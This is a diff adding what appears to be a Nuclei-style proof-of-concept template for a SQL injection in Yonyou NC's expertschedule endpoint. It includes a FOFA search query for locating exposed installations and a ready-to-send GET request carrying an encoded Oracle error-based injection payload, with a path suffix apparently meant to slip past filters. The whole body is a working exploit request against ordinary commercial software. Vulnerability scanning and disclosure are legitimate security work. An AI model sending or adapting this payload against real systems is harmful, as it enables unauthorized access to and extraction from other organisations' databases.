@@ -1,0 +1,19 @@
+id: poc-bc7g36ds4gagfnxa
+info:
+  name: 用友NC expertschedule 存在SQL注入漏洞
+  author: hacktwo
+  severity: high
+  description: '来源: 语雀漏洞知识库 https://www.yuque.com/hacktwo/dtdx2v/bc7g36ds4gagfnxa'
+  tags: sqli,2025
+  metadata:
+    source: yuque-hacktwo-dtdx2v
+    doc-slug: bc7g36ds4gagfnxa
+    fofa: app="用友-UFIDA-NC"
+http:
+- raw:
+  - GET /ebvp/expeval/expertschedule;1.jpg?pkevalset=1%27+AND+6248%3D%28SELECT+UPPER%28XMLType%28CHR%2860%29%7C%7CCHR%2858%29%7C%7CCHR%28113%29%7C%7CCHR%28107%29%7C%7CCHR%28120%29%7C%7CCHR%28122%29%7C%7CCHR%28113%29%7C%7C%28SELECT+%28CASE+WHEN+%286248%3D6248%29+THEN+1+ELSE+0+END%29+FROM+DUAL%29%7C%7CCHR%28113%29%7C%7CCHR%28112%29%7C%7CCHR%28118%29%7C%7CCHR%2898%29%7C%7CCHR%28113%29%7C%7CCHR%2862%29%29%29+FROM+DUAL%29--+QtwN HTTP/1.1
+  redirects: false
+  matchers:
+  - status:
+    - 200
+    type: status
